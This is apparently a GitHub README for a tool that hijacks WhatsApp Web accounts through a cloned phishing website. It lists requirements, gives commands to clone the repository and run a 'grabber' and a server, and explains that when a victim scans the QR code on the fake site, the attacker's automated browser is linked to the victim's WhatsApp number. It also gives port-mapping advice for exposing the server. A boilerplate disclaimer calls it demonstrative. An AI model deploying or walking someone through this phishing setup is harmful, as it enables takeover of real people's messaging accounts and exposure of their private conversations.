# whatsapp-hacking
Hack whatsapp web via a cloned website

# Requirements

• Python >= 3.6.3
• Flask==1.0.2
• Selenium==3.7.0
• Gecko Driver

# Disclaimer

THIS IS FOR DEMONSTRATIVE PURPOSES ONLY.

DO NOT USE ON REAL VICTIMS FOR ANY REASON. CRIMINAL LAW WILL APPLY.

# Installation

> pkg install python3

> git clone https://github.com/TermuxHackz/whatsapp-hacking

> cd whatsapp-hacking

_install the requirements

> pip install -r requirements.txt

_Run the grabber 

> python3 grabber.py

_Run the Server

> python3 server.py

As the victim scans the qr on the fake website, whatsapp web on the browser spawned by the grabber will be connected to the victim's number.

# Before Usage

change the last line of the server.py script to fit your needs (if run on port 80, you might need to run as superuser)
router configuration might be necessary (port mapping)
